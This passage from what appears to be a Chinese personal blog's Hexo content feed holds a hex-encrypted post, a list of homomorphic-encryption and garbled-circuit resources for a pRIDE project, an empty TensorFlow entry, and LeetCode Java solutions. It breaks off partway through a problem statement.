4f62eba28b9f827c69e21305a7ed61b856da3053d2a83d25c8183d455731db9118024189123562f741eb3e60f32ecf3608553b53fbd872591d47b1c8075563100988cbec771b84a3d51eeac4f75e64122dbaa5653cccf823f9d91b3d3fbb5b801f3412476d22e3cec0bdd617a81cba2503fb782737bfc73c4c0fe9567134baf1b0c5290c8bcabb554d66d86a67412af4b66aa4ca97bf0830f61a214517f05a89ae4e06a1eab2058a25f48bb5c847262cb2d78e29a7e09e57744449f15a67c72fcd46ec229625e03e047e9f7b6af57fcd026bd360688c09018f2c1db621fdbf8385bb3a996210f0eed2f59fe95607d0b09db4483023f9f1a8f34f84a90645417b2d151abede9e1522150d86a8361d17e5123244a759454d9e995b2aa82d66b2f09384f8144a0de6343fcdb54223281ea74153cd545c53ee2841a45fe161687322acdd58ac1fd156e6dc3e5d707983c1cd7ec3e5739bb1ed5e66175078400037bc49699b4c45b273f249e9a37e20503a528abbbf38edf4cddc1d573ebe393e790335cc183087cb78416f01912d968b1d41695fc9067b732e1ff2d2a76ba5bb9085070e566242e64f646202b874c893545cbca03c351f9121dd85e7c8b41c754e7013557e270ff2db753c1082a389a20f88ed95182fc2e39c81067289e65d895b02539520fff6f748041f923920dd95d00edc1649b712f241f2a7772d5dda0ce728de9d09c8471c6f137e4054d8c45fd4c3ea4b1750686a2b87f247d55bdb5066f5fc2d30be2a45db9330861340ba0e3f050bbfca7d76de23d302fa16d277a889929576c20edacc89476abfdbc52a7254cbfa47286e08ce6141c0e27a0baf83dfbf630e70fa431915dd0cd0db412da81705a666a124fb5198e401fdd2f51994aa29b2a386d858c00908cf8e15c710fdfd6cf9ff2fce3f360b429d7163d46888e8fbde47ce64d519c4358771bf8f98189d1cbebf5d5aa6c530234d54160678a30849a735410342e38f550ca5c81ae8c825b67483bed6a4391eda1d1c03e4cb8b7ec9650d6d3646cd8058c214dbd2c662ccfbefeee64141d239a43ad84fe873227bcf104bfb47e6ab0b2c89b4b3e759b327da87f6274493a6a72d20f466e1a62208bcf7ba824f8dfefefc13f29952492009d9cb2cbb516d68f1292baf99eef9ca21143fd3656070c0804fd21fae1eac963acf95219550b871e1f5fde90f1543b2aa4ecad9875b3c90380e86ae298a0873928ca3a748ebd588700d03a53412d2846aa8bc9c5b1d7c92beb3229df748bf9aee471028216261cab9c9481a3347966d4b3f7ce440b709d5a2f083e9e5e14c61be05470cc45935ead15400aa2ed043683abf96311e62efd712c5e6567dcd66df12a0250a31f823fa7ac727d39f5f1b9751940c8f31407509d839f67be1412844601114cc7bc3337ea548c726841054fb74ea579d14e9da09143abf3e683c54f90a4744919c1f47d90f75656c5ecd0d3059c743d1792c654e5c5dcafda5047aebb69be2af6688d8fe40ccf1c7c9e291f19589b96861339ca15c8bbf9f7934bb7468c7c85e376921f7db3768e1b2ad8d446f0dd507240dc4e92490d6d87bdebab39da5617c9cd8d43a7e80227bdbb021a848acfafbbb22d90d1316cd0122f6d0a74baa22e7f3a23ff0097728d722cef1714bb03d9bff6c7209d5f35d776d4f23a00cf179860ad4437baa10de46c2e3caac065dc4c90a85711501b4b55df411fe152514314382e07da356d5f12a8d51eea72abc5cb24328b1a6f7a283d0582927ddd224849fc3e5ae37b37bf542f3bbfad4446e15552f6e13763910638c90b1da5cc20c2062ae6f3820446b269812553dd40101655a1356efab27ef2dfca7c4ad6b15b5ea7447e4dfb579ff3b7f1ebb28b9e0ac2a3d7a55f4c2762843e336ff1c8b1f7236b6b0f814925c8b9a47b389ac8328900ccadcaec19c25587e055292b0d53ab20e6029796a65ddd60f4121acd9058ddac389444a67d797c5e9be70e2850dc363b43564ac3c69fa5afbb666475ba67a1ed28b82d839a5a91c2038717686eb588a16d6a226f1b88189702d6cea5228ad76511d5c42af6a30ab019287cbd942d4e05c76ad91a30a94e71c147e339eae062ee2d256d6edb71d4102df8c205d6defce4e04b577952b0fa1b4d99b145ba7b8ed9ca9c1eff9435f0bf2fe0f75ba940486a4993b0fa0ba6bff504f820922aa4d4c9e48a22d90a4a37eeb78a3cad7b750ad52d0b638dce6dce458701a17d373c8d9efbae436f085999aa2202fc67012c6237a29c6bcb36a0c46239545477724c9c9002a7ba3db02b98aab881ae70ef45bb180251a910a0245bda4eca03a41afbaa4c381c25b041b78a7c3652687763b95f8046c0756be7390ba6084d600412265fd260bc4f5e8ef39e18c2b3d377cb15fba7b2717fc0289aafe13cd5b06c01415016727c54b0b6276967d833786f2e9df22efe3a3b56d200b491cae4ae25ef849e3a48337324071aed446fdb5c5af60b076c20c757056f509c5a66d369b67f121a1922ac1bd2f38501b48449987a859c401b5e6c6397b2d1f59d745d3b53e16c99da8ef9b546172e4567619b2a7b77a1334da5cf29e6953e98bdbd97c135b6431e2055d544e13ada89b8021aba068aad19939ebc0b8886df15f91ddefaac35f14b316612c461451dd350876970cd63faa19fcd87eaf5d30583808eaf604f873bd9daef91f81ccad7af7801815552c4a875ad1ced8adae77881e4db4a78fe2b04748b7d88dc28e86c1f4ff31d98e3ab7fc053d2c3511982018c73f4a8228b09bb6323a4595da353e036a8ca64c23e9eebf6732aa5197d8c453bc35b47224d9239ab6a473f39d21680d72c9c175fa32baae0944c725ebd79ad8e922af238846ef04b466ed1e3a4acba5497e8a2d6a5fc62d155454c5ca8922e663ade77b8407c5821e668a6cf89d0d37a2927079b009f8e001a7187d8d726d3ee7ea08ec5318993de80d7252c486baf19ed72976522e8002ed2f2f221e376f286d61026a07266ae5d2c3a302c16f56afcf1f8a722b40eed89e97a0478fa1056d4b2e9e099c022c21324e76cb2a12ef70bb51407d735a2435f0de4c40dc04e3f7e53da769980b794b45065b65baf59e2b4947cff131fa4eebb8b3ad2f86b481aa60f969319f1c31ba6809434bed5bd7f45fd7ea30f2b95fd03c93013c0439de2bd765805efd7ecc158be2d5a66caf947e712758a6d00c03b5cfa8bd89ca64e9cb336b14dac4a984dd63939c72dda2a1c567840cf66d75e5b1718629613e9e0af832c16883e12846ec2448e3f28322a624f715a8d3e48d3d57634f4fc29303c242592cc87dbc1512b5bb34b0fae2a812af5cb6e22414a315c48b9419b3058a27b7f138490e652b24d7c67c92b4b73f9ccb6373dc2d3d5c0adea426da6081a684a300f2d651ba3f1c70f2f7c33575f9023dfb09954ce83610f67ae40778282eb59ac41501fb1b94bdfa1b73bf12a8dcfb979de2a8b93f5ff21f30ca285060f90a8a4e8209c7fa64380bbe8b510ec0a1c434261b46b584cedca1976f5762c64e5fbe2d2f6ab0531afc4faa558fbc311f0f7af56fa91e71b842988eeee911cb4eb39f989e8a4f78d54840bc05a445ed7bb881fa24cbc65b33f4910fb3deef7d45e092721a8a0a32c2d4c3e24a73de276fa3da61731a279c8be147c82db0f0fdc77d111a31a3da68420164b10b9c3e41d7651ce09889690c64ea1a5e135ec2c240438cd81507eec4600775d19d3bbbaa654fb24ad436c69c259cb92fdd267adc62941f53ce83b9a71eb1678dab2992dc7a020a44f7567e6b5ff26a18eeceac6df0fc42cdc03fd5b0353ca47efdb8f64d3b82ec08602859241e1d9893c08fb206e486d4353a0f84f80dbc87f425b9e6872b7f6e4f1aa1a33c5d33cb0d8f8836ee88f12c66249d065407a66088cabd973ddf7822675f8338f80c6b5789ebe2c1d1e62e05c519a99bb1e61530554e3e8243d8135e1ddcedb1a4ae65afc4e8b3f5945b43f0d4e6789a0e37594eb531f1eae8d4e54d3dec85b847deccb56447c0681e5dc41b77a554d938ecf57e6fdba732b1dfbdf5088fa899204c0ab62ae078aa62251dfb57616def93eedf39e023b92dcdfa6a804503361f76d48d05fdb54e5c1418d902d078fc0cd007b2d2dc171cf0d1b3c530358cca185aecd03228ee9e4617601d825dee257ec5ce766d1f093c59cbc7172c3c174e66fc0e8dafc4415736e4edd16b5fbd85805ea4b458251411a283d46b7105b4c9d3b3767a7c62d543b2041b526a6f0f6f8de234c13ce1eb98b07344a8008f49beecf49842fbb7614fe877cb530dba217b015d922fdff0ed8a565ca61499200f5e8e751f17b00d9df818bb6f7bd03857606eae76f5e9370dc44d28a23bc2c4d3414051c56a267b9d26b6da8bc63446f8186bc38a7815e4b128a79bd6be8596936a80257c2bd8c31d70aa12f736b3c46c3a90be107804839c4b07522010313e00a323d172c8ffe6892aac3a8fb2896b2b60e63aa0a24bafaf3745e1c9b728cb114367bad40404f693d60b287e24012048f2968a1e28a9f35fad87cc560393a2ce8bd31aa91997fad768ede27b294a1df3bc9dafd770b641280e36d5e4795632c326a85864881ea31838dad3c676bf31823f1587b0800a2617699e455e811bb3f5817182db523f54e3adb3efe5ece5c20ce0981674520a4019e2725704d0ceeb25eabd272651c4a0f5042207a1321998482bce62efa6fbd9ce94ecc8c3afeed52983618a98705c6c20b13659b3282b11c0c4da7d83ac0a656e23946d015560772c6955747f4f2167f1271f3415b9da1738543786ef21421df6d679a2faab8b95520a6c1f07678ab37eb37a5c877ead98295a8ed2022d9f7eb2f725d92e2b97bdbaeeeca659a2590e5adbde040e4a29d3bac342f01b3085052bd49bb7729616c0fe839ce77bfaea9ed2c2c7c386f068205e07c41eda01e7f8682117d9f2058f56e97f3975670494717b383b9e993bfe118aef03984a64536e37a0c477932b719aa0753930264a8905a227ad1e114286eaa9f33f1d9e930038d76c0c61a7991ef385e0da3d0bb9f46b6121c6e7eee677772fad31e304ac0de724097edb7d2603403e5c2e9fdff610518ea52ece97d95370adfcaa1a362f4cd5cb58e151ec81e184d698ede855d3b1b73e0f5b655d44d523937bec7016994487cb15a234ff5c1c3d5662f7b96db4d42ba9b8b74a66a98740e3d99b7b490a0cf1cb743f401ea34202381da699a5a44f87a913886d0b417f1d4196a3e3f5b54a994b84722d87aa6d750fdce297f7d4981c98909e235383e6a46efe0eeb03d28831f181cc3ebdafeaec19202f40f9f3744601894871b61a51f90bafd3f3a21a9e4ed852ff9f1aa723a03c7a27b455b17394747478e1538a6b1d2428b139a90638c8567675cb5a58a71b448b9bccb68195d557607f463f710103a241bfe16339e50bc9736c90c58a8835ed1d2eac4a7a89a78b07dcd467e3ddac9a3db00fdbb2d2df9241bb26609c5bbc760d1d94855e8d906e1f66109b4a25e020d2a8273244df48e0cafcd37e3457d97d123cf514c24354725ba2a9272dc0f160e6954c0d8a9ea21cf77d6fffcf8daae12d503ca7db0b23c99ea77339164432b875538890475f772ca3a54a7a770c97b595b27c227d7f55c333a5c2c356ebca287b9916a7fb266940063b9ac31f4466cce9532e5482b0b03374d8400a5d32e585b19c2b3c8f627746e352d58cd2eaeb7a367f186fcb26e200abb6db92bb00316bb5d00371fcb1ee54851b251684fc891670579b7cfffc664bc2319e5f2c29bde8c9f84a416527cc650b8f423f1cae604359111ad0daab102943d56d075cacf811d30893b416ca928dbff949fbb9fe2c533354aa8e70262235a36d37d1d51094c8c14134728041e1db1e9b12bb0f31ddd5678a0ef702da0dbafd4cc2d51c51da0756b0317d190037b1a59dea8b2e5e27522f27c46557245fb8dec65438dc90db92040fe7bc5d8893bb540fe67f19706c4a7adb085ee98b48c8b0acf9dbcd81e6f9443427c4ffdfdf8fee5ee3cc9a99056420052e74ce08a6dc023adbdcf47f76defa08cb5bcc3638b060d0777dcedfccc3ab3f1fbf9d52fc497b8fb02eaf26a477d2287d1cfad7562d43988452215847308e8085f9992d8506daf3746c731d47375539a85b070280d68b022ed5e9e2e90c76fc0cb95590f24f3240fd7b61b800546470269bf4f83ce495abeb066cfbc4d2058f5d0dabcfbda54d8df8eee9c134f6461f5d98075c50932dd240cae4cf46f48bed9c2a765caf8194531a5e37ff70be829962247817d077234a33411e7795f32c0cd4025df54c3f72fc4719b08a827b69de2e44d5450af4521f3d55f7fe7b37e97a263468ebd01b04096aa97834e3cddc186220d52ee6b5c029697904dd369fd697ab065a25de5196eb9e31c00e28f4edc094d1ec62732f89f9b1222bdad429c386c3448f34bf850f7fb2ea3f7b7322ddfcf26fba655678aff62af30076bbe6a4f64e4515542ae458baa0c197134ebf54af6e53fb90a548ce1c5ef8631653e7b49bba672d57981eb24c8e5f4c660622b5ff464db33b75883732a3c250830d6ad59f692c30579fa313fa0366a591695e3d3d09cea8a93409b5e83284c5c4f2a2f5c04155d14c2ea38bd3440f33b59390864e429821bcada171bc5d3f4036afca5c15063d7959fb45d9fa20a3cb1d78c9977fe086a30c74b614e03088229005875164ccf921c4947ffad58654b80b76fc7b990c27f39914c287b5c6f8ccbb6f0a4824fe91f7ffb116de323b2a80cb15bb90e1ba79a65463eb653616ad1607fc8b16b65e8728df5cfb03aab8dc71f9ffab8ce8784e5939f1c157f8c7c6f2616e200acbd6930454d84aeb5e742831e4d85404e2cbf3c845535a968b2190241f2a2d0751b9576f92b3240ec3affd354086e3d6e4e84bdbb65437fa6372e232cb07827311ec45015578892c36ac0d613ce2659df1cfb7422576f8952ae9b405d0fe93eb3fe940ece09fd0b6fed0bbf82dd330bdeb2dcd825666ec211fe87a2131a60ef00331a02f75e79c4de0a23b8fea28f69821d68e198dc259bd183073101a48e5a87b7bfcffa013502431965e45332103aadb8927214c4c6dd9f8cfa9440d7d38ece199156c0f2aed2f576ab6fd355d8cbdc61234a98465e19c9af69a0d56c6f7eb2febf69ce41c645d21e6dc46825cb6b584ae0c3ac1fb9ddc00f2bd8b0bc81a19a4e70637807c782c2b1623a1dfc03a2dd9489d4e38d156eccd62aa7ec223b7dfa409ce28005c00e6c5be374e53a0e8e0e38e12f36b672d04fb2cee355082d458d860f981146b97d43e2df893f268f16dcb0d8e7e57eba8b7d9488b0b6caccad688cdf1cb87f5fc619e7f5140da4ad72b5a317e2fd52467fc1626cca727b8ec3a26a411b9a568a89736d1d3c69994b4e315e34a47aa3ff89fda1335992c3e5f9fa311634b95f430b24fef1ae291ec6cfc28fae2cb9b5d4c37fd425d19f267fecccc38bb029be1fcaa6ba8aac8ae4b46e8ecd65348ca56423f9292e030093b45732ddd3d13a5fcc109f42a21188872aa7964b1cdc52a0f937f847c1449c1dc83b1f1e6b50f02889f0ccfab17951d99860f114181a9baf1efb6aaa056a2f5fb9cacf3c5203974dd200c4d4c06da333b44903c2c7707febe1de3aef1638b0274f0b4bf6634f2a3a47a878cc40ee90eb92063c0a8c7683d1da576da31f72174c0cfd817c0b42a31612102c6ad6df4fce415bd4f7c2ef51ac51827a5a1b13e964d79fd0e4c93a1203d16cd4a2c40c27087edbab20e220f07b70034567580cc8dbbfbd1fa7aee6ef44d59cfc5dcc3b03c680e3efef56317517c0e2323449d7b2ffeddd276d3c617c20cccd6be1225a3e65ab47edff554e708200d548f9d3905b84a26a533f805121d50e5487152ce6a2ed0e467a076de88720112d80a66d6980834d67f7f05758aff4c542692d88c7657456808565712e28caa8967004a37b5d92482a3bb414d5740b915467ae4244b561c3bb069da7cab00be60fd98135eb55831cd736a5aed14ea996f4edb6012b51d03349c17f0601388382dea4b5d0bb028e17eaa7f124519362ebc58461a020fd0902441c4f8762c262152734ca30c7a4e26564270ec364434a108715f146bad875323b90082e35287854c123245dbd0ac23659c22c25e5950935bad3e3c5050d4481c7aa80ede748401a4a4f14e5fdaf384d511666d28c4735cc142c3d1b4e04d48c9c2f1fc117742cbc4c791aeb48c70d5524975e8db42bd94419fad80d2eb0aa09a14f583c9d5dbc0069918f81563c3d92879330a35b74fb6286ffecdf99d9922ee17e7fe93f96ad93429863b95fa051e0c766c39639d48bec8ecdae53e152b9da46b3bc66cf448bbe1155a4a3697b1444cb74f35c071b3f8fc1d9938444c37314912c07d379142c86fa98491a553095caf43e74465ea2e7fb1198aa0f3085372a16d6f87c2ba2d3882d75f3211b8c8bd8ed031bb075743ab574d8d776b44e079b6188b08b1127fdc187b95a472b397cd7d3ad7ef440544ad3345d9ca4ed1fa773a197639723f4a1616d83920c3d429c6212195771bbc7860925641624b12f1576b33d7171407c16187dd76bc470a781caa671e903fb3f5b0ac06cfbcea860907dba5ceb047844897b2000d591e451fb0ad0422072939151031baf9d8c9908ad8f83e8a4e3ee3483efeeed31b0787e8cd9579182fcda4eddebfe7b414d1bf6b1c563cb382b5dc617e8c8757d306aee95ea7728ae9a378d74bcef600a8a578582a42ba71d766850d9e8cbab5332d30c53cdd8b2dee76723bae3254440a1318f649668d60c3bd6147a84d3ff490a522a168bb31b12a7779e687ae4324e6c5aaea3838ea76b1db30fa74d86fbf229c8f87c3110328fb3475c5d2634090945a4b5b01cf47d488c10b935863ad27fa4ef70fdf08f9ce7e901a4858040966a72890d7ede28f056e9aa598daafa09a111633f06b7f4a1fcc67dc7cac9a99a66215acc1f14a29e1f497d427deb6a0cb754bb25e88961c532aa41cce735fe18079752a60e458302e0a463613c4637544c88cdf2ced8c4d172ef264a45a40a44f38e9f2f7657fa75b9b27184cff584a6a449aaea3201d60f273a3dcf278136311e3f38b4c91df767d5ed94811d6a99a78c338ccbfe7e1b5480d2d55764c8460ca6586da7fd6d2a682952fb2fbc03ad2ec13f262d19993f4a1a61d99c424821e277e5503e2b4cadc3f2ccb50a021d02419a80be9d53f3076be3ebdbe691a251ba45cf9898ed4557887e39284c0747525ffb099e9d593dcb8969c77f109360aa878402c12593b11cb823c0c7d4adec0ec82d2038162e616e0f33ce8972b9c003bd22671fe4ab24896d3fc7c5a42635e3434abf193f2cc4e2bb56d6552c88092b656dd423c7fc9abfda8c1743e10c22c9a8d2c2e2063bd0942b469d6b3664e80f64f7b14b90ce7902c62f1505045eed030240a902a75f77e1eb69ef8f75f2168b7a3eedc4f60d5694ae5d3b6f9f6dee6a7db626cb4bdf40de1be9c1ea70e8d99306eb234cbab1d56a04041347f4b0d0b74b99e75fd80e30de727541b3664bfbb0fc59158e49f07c8eff1cccd5751d7a4591b29bddec34c440ca36c4a3d4ba0d38a2624c2f2f8e54b5e128a75d3b45c1447fb80d3a5c7dc5be1220dc3f9fbb564889dcc6570c3507aca7772ec273853d90aa6304f22268e43bd21217aeee3be9ecd9258d09864f589bef305f73a78f554cbfe985d7720320052fbbbdbe50dfb9323e89f4a8c04ed0e52c725d8ec61c14e7d55c84a070d960c1e57658acf0ddcc6d909fb4036c6fb797471053ef55ef9083bbda5480cf14cd2de2a273298f51c95714522dc42903fa078914f0631aab63891ef022ef95f34e1126f1e6abbabf2390772952876bae84bbc8b6c9b98806376116c7e508b457a21ec9df0d6e9f0f690d7cfd155c8f25fe899c997d7ddfb622eb7d1ae566fcc0e4aaa9e869087dc0a2965e3031eddb4945440c9372867dfe912fb89675df27b35cfefd224359fe08a950a947f3225270bd08688b2893c622a08159fc0319e727769cb045a453d13dbe2f4092133a20f8f5e54ff586a6eb7d2cb88ac4b6a7990fc5a1224a9ca223090413d1027a43dc4db67027a4e45ae872eba1c7a0c830a423b28560a7c98420e66210f96874bcb0bccf51aa5bf40dca19d1a824ef1a446a7bbb5257cf46d00bdcc01e210fbbaa62b64966d613911981d8df79b7b61d89cb2121ffc0a5d4053d8f420c8bcb112990b2eb37a319cd7f4cc88a42d8732b86b6d54e3c2f33fbbab15b98d270b11d528821986f96bf721cc82a854e8230a01d568bc09c7f67f0e29ed5e785e9d9e2fd9e6112676eb118068202448f6fb8403cfed3205babe86a6020b6d82fd6adeeb9f1ec5202f49761603ac175c8f306c362958b5580b17488c4e214c36c9a5ee639851d3e63871067e7d793619d3bc423f339bd2cedd0fcf384165a69223f248abc62e721131420bc33578a3524af243fc556fda08a903607affca1976b65b9081bd58d2ee3cfe9029c51e9ea28231e6973c9a89021036d6ecc792106f84d74885b8d7f8492432b268732f80865dc85d46659b358cb9d1a102d4fde7dd989524675ffa87206ff7c2fb101ea859105be4f16db1fd81544b8af200e157c187f05d06190501cdd926854f17a7a0bc8a571fde691df6f4441613a4925ca5abefb2ada6f9b0308599ee0b5a586bfbc373198b47315107d0b88129ae20fee1462a9345e83939a91bae032e6a68ad86e371f02071f90adf154bae465321cce53266d8af2cf02607ba25342cf1aa8d5ec18736acdb70b5f2074b663cfca6826a8377183e2183c8c24f86b9bb972475a0811d02ff0ae53e640e14bd04c3043c0f9ff5650b08f57f92bd5203c0dbeb3cdb414bafa11988aa3e3935aba5bc21588c96d695bce4be6c3324c30d249449d02cd6144566b0081356c29df9067b5f975021ffc0c7e31f6a5434b42f87e0a1bd6bc1e5a5f0b5a5410adcc7b4dd91b6c1983f5a64816894e088392c091e9b3106ea0c87f8a1d12b515ce2d3ea8ed8b3b65a5ce2b066787ef2ff29c54c66f2b7497b419216b1009cd9446721d499d3a89994a1642ae1d28904513f20c620a6fe89ad49fd92440c2eb39ec3d2762912c6a7208bce413b05f24dcfeb8e7bbe3dde6df47bd38ded00f1ddb59f610f82ee688ad65317dbf4ccf43c9872ee5dbb9db350e49e86a0f68f1d7f16e5ed0b702e047380afd38894e4438fcdc0022fad3e310d2f2f732f0616eb8a9844632cdaa07ad53dfcc9ce109852d331103cbe23bbb17986766afabb3386ab029f274d7b566ac72f7d580315d08557d1e0b69a02b065b96fbeafd325517643a0de93f6a18596ff04c0bf9a079aa82dca0d6ff40735aeb0f963e525bc9ec60340f1341a163fa75fa4bc76103872f68d313c0fd0e0addf5c0c13e0fc6b761dfc761c6b0bb2f903d482f2ffb4eb56d08df50e7d17a25ab1a7685ccb5a3b58793cb0249e9dedf0cdbb676da127afb88b90668cf5afd547f0d2447e164f8a832ed488f9e18da9920a534e550eb9d8ec7bbbbc72804c2d8b6cd637d3e5d2aaee81b7f928d9729f4f466b26231a700f2a02c0406652560d07ae607d507cac7ac7878424313d40499eba2c188212843358c41f8d5a4b80edc886966369fbb682133aeb8b1adca58f721537108c937b920deba8b36f4244922aa359f9839de645a99152f1f349d8572d5f868c1939873ee4657381226f442391c45e7090e2a40d7d06f803baab10ba830e097e010650705e16b8347ea3027cc469c66614ee9d889e1ccc355953b1ce65804b0c1ac392b5ea9062a05c72d471064a387e08bb83b95a1025c42e5872d9a4f7efe0c4f0d38b107bc0da7a12865de0cea1f72dc67b680a0b4849c57405e3c69b03be8a756b149815b65e6935d8c83403fe04323a13c155013f65b06a1a8f32738cf6ed0503ed66ea533008d8bb7130f5dd14c3e4359a8dd2ff77dc88e83989c8c60d7fea2b9ddde4c229ea021dee1f8133d50cb7f98a2d160d3388302f456fbe31319c638f3eec4859c713f4186fda35a997485326ff15e130a79ec3124dbd108c315e0d7493c2d80c9a658835d86af6639d05e49bee7fb79e3c803963ad2dc64bbba885c707e941709bd49887b9073c4ebb8d7a640380272dc24273b69f1c15df0cfc8cdae9d674fe9e6e50f8ab8b485fa51ae918ee0ada625e8291ec6706a3d7882f70d6d95e951ef14cd2c75bf6b45b48dbd4bdc667341cdcf874a5c4f094dfe5adadc8f60e3c91a73e46ef394286fe27e6bb1c660d070febd6f5a1e797f8d6c15dd4e8d59054387006c42a14d713772bafb64f1205537ad181f6683f6c103d369d5fc07e1fc19b207c6c906be2d8e1b35043bbe946e4afc22ece8aaac41650061c0e2db534aa6de75595676606fd0128cdd823d4ef4af1f14f09371ba9899704ae00c02f2ccaa2b13408c9ac82b2cc9a1b756451d28fe7e75e2684b6c006618b9b4a4df6e1d586c64c3c5cb127aac0d656a54aaf6454f4b0394dc1b12f2fc6bf432cca008d2ae9ccb409058e040092b73d9f9db1e00a9fcf3c2bc20bb7d67013285c790afc856fb6284b093e8bec34a708f67ecdd15dad26fcb896f60f965e840129cd08c5cbb811fcddf33db97279e4906fcb8234dde08ff457410a84d5288f92c0f848f74485</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>密文</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-2-4-pRide-current-search</title>
    <url>/2020/02/04/2020-02-04-pRide-current-search/</url>
    <content><![CDATA[<p><img src="/2020/02/04/2020-02-04-pRide-current-search/image-20200204233855033.png" alt="image-20200204233855033"></p>
<center>这是一篇关于pRIDE所用技术的检索结果</center>
<a id="more"></a>

<h1 id="1-路网嵌入（ROAD-NETWORK-ENBEDDING）"><a href="#1-路网嵌入（ROAD-NETWORK-ENBEDDING）" class="headerlink" title="1.路网嵌入（ROAD NETWORK ENBEDDING）"></a>1.路网嵌入（ROAD NETWORK ENBEDDING）</h1><p>目前的思路是自己从百度地图(google地图)查，然后存下来</p>
<p>至于用什么形式存，555我也不清楚</p>
<h1 id="2-同态加密"><a href="#2-同态加密" class="headerlink" title="2.同态加密"></a>2.同态加密</h1><p>pRIDE论文有提到两个链接，我觉得挺好的，应该可以直接用</p>
<ul>
<li><p>github-上的代码-jPaillier    <a href="https://github.com/kunerd/jpaillier" target="_blank" rel="noopener">https://github.com/kunerd/jpaillier</a></p>
<p><img src="/2020/02/04/2020-02-04-pRide-current-search/image-20200204233652918.png" alt="image-20200204233652918"></p>
</li>
<li><p>论文还提到一个JDBC（不知道是用来干啥的）</p>
<p><img src="/2020/02/04/2020-02-04-pRide-current-search/image-20200204233714656.png" alt="image-20200204233714656"></p>
</li>
</ul>
<h1 id="3-混淆电路Garbled-Circuit"><a href="#3-混淆电路Garbled-Circuit" class="headerlink" title="3.混淆电路Garbled Circuit"></a>3.混淆电路Garbled Circuit</h1><ul>
<li><p>混淆电路介绍，知乎上的，讲的海星</p>
<p><a href="https://zhuanlan.zhihu.com/p/41172002" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/41172002</a></p>
</li>
<li><p>pRIDE论文里提到了他们用的是一篇论文提出的加速版安全双方计算混淆电路</p>
<p><strong>Faster Secure Two-Party Computation Using Garbled Circuits</strong></p>
<p><img src="/2020/02/04/2020-02-04-pRide-current-search/image-20200204233855033.png" alt="image-20200204233855033"></p>
</li>
<li><p>github的搜索结果  <a href="https://github.com/search?q=Garbled-Circuits" target="_blank" rel="noopener">https://github.com/search?q=Garbled-Circuits</a></p>
<p><img src="/2020/02/04/2020-02-04-pRide-current-search/image-20200204233627276.png" alt="image-20200204233627276"></p>
</li>
<li><p>github-某个java仓库，我觉得挺好的</p>
<p> <a href="https://github.com/thanosba/Yao-Garbled-Circuits![image-20200204233556551](2020-02-04-pRide-current-search/image-20200204233556551.png)" target="_blank" rel="noopener">https://github.com/thanosba/Yao-Garbled-Circuits![image-20200204233556551](2020-02-04-pRide-current-search/image-20200204233556551.png)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>pRide</tag>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-04-tensorflow-gpu-CUDA</title>
    <url>/2020/02/04/2020-02-04-tensorflow-gpu-CUDA/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>1-10 leetcode题解</title>
    <url>/2020/01/26/2020-01-26-leetcode/</url>
    <content><![CDATA[<p><img src="/2020/01/26/2020-01-26-leetcode/1-10.jpg" alt="1-10截图"></p>
<a id="more"></a>

<h1 id="1-两数之合"><a href="#1-两数之合" class="headerlink" title="1.两数之合"></a>1.两数之合</h1><ul>
<li><p>题目</p>
<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>
</li>
<li><p>解题思路</p>
<p>主要的做题思路是遍历每个对象，如果target减去当前的值A得到的B在map中，那就找到了！</p>
<p>就把这两个位置(一个map中，一个当前位置)返回去。</p>
<p>如果没有找到，就把遍历到的（位置，值）放到map中</p>
<p>//以下为一个战胜100%的java代码，99%之类的用的是Map，看来以下这样写的效率应该高一点点</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">       <span class="keyword">int</span> maxValue = <span class="number">2048</span>;<span class="comment">//样例中nums数组的大小应该不比2048大</span></span><br><span class="line">       <span class="keyword">int</span>[] map = <span class="keyword">new</span> <span class="keyword">int</span>[maxValue];<span class="comment">//和Hashmap一样的作用，存入的值是（位置，值）</span></span><br><span class="line">       <span class="keyword">int</span> tool = maxValue - <span class="number">1</span>;<span class="comment">//2的11次方减1，大概是用于做hash的作用</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;<span class="comment">//遍历每个对象</span></span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">int</span> pos = map[(target - num) &amp; tool];</span><br><span class="line">            <span class="keyword">if</span> (pos != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//如果target减去当前的值A得到的B在map中，那就找到了</span></span><br><span class="line">                <span class="comment">//就把这两个位置(一个map中，一个当前位置)返回去                </span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;pos - <span class="number">1</span>, i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map[num &amp; tool] = i + <span class="number">1</span>;<span class="comment">//如果没有找到，就把遍历到的（位置，值）放到map中</span></span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h1><p><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-palindromic-substring/</a></p>
<ul>
<li><p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
